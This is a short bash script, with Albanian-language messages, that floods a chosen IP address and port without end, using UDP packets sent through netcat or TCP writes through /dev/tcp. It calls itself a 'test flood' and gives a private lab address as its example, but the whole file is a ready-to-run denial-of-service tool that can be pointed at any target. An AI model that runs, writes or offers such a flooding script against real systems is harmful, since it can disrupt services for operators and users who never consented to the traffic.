#!/bin/bash

if [ $# -lt 3 ]; then
    echo "Perdorimi: $0 <target_ip> <port> <protocol>"
    echo "Protocol: udp ose tcp"
    echo ""
    echo "Shembull:"
    echo "  $0 192.168.50.101 53 udp"
    exit 1
fi

TARGET_IP=$1
PORT=$2
PROTOCOL=$3

echo "Duke nisur test flood drejt $TARGET_IP:$PORT ($PROTOCOL)"
echo "Shtype Ctrl+C per te ndalur..."
echo ""

if [ "$PROTOCOL" = "udp" ]; then
    while true; do
        echo "TEST_PAKETE_UDP" | nc -u -w0 $TARGET_IP $PORT 2>/dev/null
    done
elif [ "$PROTOCOL" = "tcp" ]; then
    while true; do
        (echo "TEST" > /dev/tcp/$TARGET_IP/$PORT) 2>/dev/null
    done
else
    echo "Protokoll i pavlefshem. Perdor 'udp' ose 'tcp'"
    exit 1
fi
